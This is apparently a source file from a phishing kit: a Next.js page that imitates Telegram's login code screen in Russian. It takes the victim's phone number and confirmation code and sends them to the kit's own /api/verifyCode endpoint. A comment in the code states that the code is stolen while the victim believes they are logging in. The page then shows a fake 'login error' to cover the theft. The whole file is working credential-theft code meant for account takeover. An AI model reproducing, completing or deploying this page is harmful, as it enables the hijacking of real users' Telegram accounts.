import { useState } from 'react';
import { useRouter } from 'next/router';
import Head from 'next/head';

export default function Verify() {
  const [code, setCode] = useState('');
  const [error, setError] = useState('');
  const router = useRouter();
  const { phone } = router.query;

  const handleSubmit = async (e) => {
    e.preventDefault();
    setError('');

    try {
      const res = await fetch('/api/verifyCode', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone, code })
      });
      const data = await res.json();
      if (res.ok) {
        // Show success (victim thinks it's a login, but we've stolen it)
        alert('Ошибка входа. Попробуйте позже.'); // Fake error
        router.push('/');
      } else {
        setError(data.error || 'Неверный код');
      }
    } catch (err) {
      setError('Ошибка');
    }
  };

  return (
    <div className="container">
      <Head>
        <title>Telegram – Код подтверждения</title>
        <link rel="stylesheet" href="/styles.css" />
      </Head>

      <div className="login-card">
        <img src="/telegram-logo.svg" alt="Telegram" className="logo" />
        <h2>Введите код</h2>
        <p>Мы отправили код в Telegram на номер {phone}</p>
        <form onSubmit={handleSubmit}>
          <input
            type="text"
            placeholder="5-значный код"
            value={code}
            onChange={(e) => setCode(e.target.value)}
            maxLength={5}
            required
          />
          <button type="submit">Продолжить</button>
        </form>
        {error && <div className="error">{error}</div>}
      </div>
    </div>
  );
}
